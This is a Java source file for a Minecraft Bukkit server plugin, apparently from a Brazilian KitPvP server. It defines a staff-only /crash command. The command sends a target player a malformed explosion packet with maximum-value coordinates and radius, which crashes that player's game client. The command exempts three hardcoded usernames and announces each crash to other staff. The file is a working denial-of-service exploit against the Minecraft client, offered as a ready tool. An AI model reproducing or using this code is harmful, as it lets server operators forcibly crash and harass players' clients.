package br.com.vapoxmc.kitpvp.commands;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

public final class CrashCommand implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if (sender instanceof Player) {
			Player player = (Player) sender;
			if (player.hasPermission("ciphen.comandos.crash")) {
				if (args.length > 0) {
					Player target = Bukkit.getPlayer(args[0]);
					if (target != null) {
						if (target.getName().equals("SudanoJ") || target.getName().equals("pedrokp")
								|| target.getName().equals("crlshnrrq")) {
							player.sendMessage(
									"§c§l[CRASH] §fVocê não pode crashar essa pessoa, portanto todos foram alertados.");
							Bukkit.getOnlinePlayers().stream()
									.filter(players -> players.hasPermission("ciphen.comandos.crash"))
									.forEach(players -> players.sendMessage("§7§o(STAFF) §f" + player.getName()
											+ " §7tentou crashar o minecraft de §f" + target.getName()));
						} else {
							((CraftPlayer) target).getHandle().playerConnection
									.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, 1023.0, Double.MAX_VALUE,
											Float.MAX_VALUE, Collections.emptyList(),
											new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
							for (int i = 0; i < 8; i++)
								target.sendMessage("§2§kajdioajdiajdiajdioajdoaidjaoidjaokdj");
							player.sendMessage("§e§l[CRASH] §fVocê crashou o jogador §e" + target.getName() + "§f.");
							Bukkit.getOnlinePlayers().stream()
									.filter(players -> players.hasPermission("ciphen.comandos.crash"))
									.forEach(players -> players.sendMessage("§7§o(STAFF) §f" + player.getName()
											+ " §7crashou o jogo de §f" + target.getName()));
						}
					} else
						player.sendMessage("§cJogador \"" + args[0] + "\" não encontrado.");
				} else
					player.sendMessage("§cComando incorreto, utilize /" + label + " [Jogador]");
			} else
				player.sendMessage("§cÉ necessário ser [COORD] ou superior para executar este comando!");
		} else
			sender.sendMessage("§cVocê não pode executar este comando!");
		return true;
	}
}